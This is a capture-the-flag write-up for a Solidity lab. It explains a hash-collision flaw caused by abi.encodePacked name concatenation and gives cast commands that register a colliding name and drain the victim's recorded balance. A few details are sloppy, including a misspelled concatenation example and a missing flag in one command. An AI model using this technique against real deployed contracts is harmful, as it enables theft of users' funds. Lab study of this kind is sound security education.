The setup first will register itself as "**Hubert Gallanghar**" and deposit 20 Ether alongside that. What we need to do is make the balance of "**Hubert Gallanghar**" become 0 to solve the lab. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Singularity.sol";

contract Setup{
    Singularity public singular;

    constructor() payable{
        singular = new Singularity();
        singular.register{value: 20 ether}("Hubert", "Gallanghar");
    }

    function isSolved() public view returns(bool){
        return singular.checkBalance("Hubert", "Gallanghar") == 0;
    }

}
```
&nbsp;  
Now let's take a look at *Singularity.sol* to see what we can do and find the vulnerability. &nbsp;  
&nbsp;  
```solidity
mapping(bytes=>uint256) public balanceOf;
mapping(string=>mapping(string=>address)) public Member;
```
&nbsp;  &nbsp;  
We can see that it has 2 mappings for *balanceOf* that will track the balance based on the unique ID generated by *getIdentity* and *Member* that will track the address of the respective name (first name & last name). Next, let's see the functions. &nbsp;  
&nbsp;  
```solidity 
function getIdentity(string memory _firstName, string memory _lastName) public pure returns(bytes memory){
    return abi.encodePacked(_firstName, _lastName);
}

function register(string memory _firstName, string memory _lastName) public payable{
    require(Member[_firstName][_lastName] == address(0), "Already Registered");
    require(msg.value > 0);
    bytes memory code = getIdentity(_firstName, _lastName);
    balanceOf[code] += msg.value;
    Member[_firstName][_lastName] = msg.sender;
}

function withdraw(string memory _firstName, string memory _lastName, uint256 _amount) public{
    require(Member[_firstName][_lastName] == msg.sender, "You cannot withdraw other people money!");
    bytes memory code = getIdentity(_firstName, _lastName);
    require(balanceOf[code] - _amount >= 0, "You don't have this kind of money!");
    balanceOf[code] -= _amount;
}   

function checkBalance(string memory _firstName, string memory _lastName) public view returns(uint256){
    bytes memory code = getIdentity(_firstName, _lastName);
    return balanceOf[code];
}
```
&nbsp;  
We can see that in *getIdentity()* the unique ID generator is actually using *abi.encodePacked()*, which is not recommended due to the direct concatenation. Here is an example. &nbsp;  
&nbsp;  
```text
firstName = "Hubert"
lastName = "Gallanghar"

abi.encodePacked(firstName, lastName) -> "HuberGallanghar"
(hex form) 0x48756265727447616c6c616e67686172
```
&nbsp;  
The function will return just that, so let's say what if we register ourselves using the first names "**HubertG**" and "**allanghar**"? Yep, that's correct; we will get the same concatenation of "**HubertGallanghar**", because the return value of the *getIdentity()* is also *0x48756265727447616c6c616e67686172*. Knowing this, we can just directly register using the first name and last name of "**HubertG**" and "**allanghar**" and just send 1 ether for the registration fee. &nbsp;  
&nbsp;  
```bash
// registering with HubertG allanghar
cast send -r $RPC_URL --private-key $PK $SINGULARITY_ADDR "register(string, string)" "HubertG" "allanghar" --value 1ether

// make sure that the balance is now 21 Ether
cast call -r $RPC_URL $SINGULARITY_ADDR "checkBalance(string, string)" "HubertG" "allanghar"

// make a withdrawal of 21 Ether, emptying Hubert Gallanghar balance
cast send $RPC_URL --private-key $PK $SINGULARITY_ADDR "withdraw(string, string,uint256)" "HubertG" "allanghar" 21000000000000000000
```
&nbsp;  
Why can't we use "**Hubert**" "**Gallanghar**", since we have the same bytes? It's because the original name was owned by the setup contract, and it checks whether the name owner is us (msg.sender) or not upon withdrawal. &nbsp;  
&nbsp;  
By running the command above, we should've solved the lab.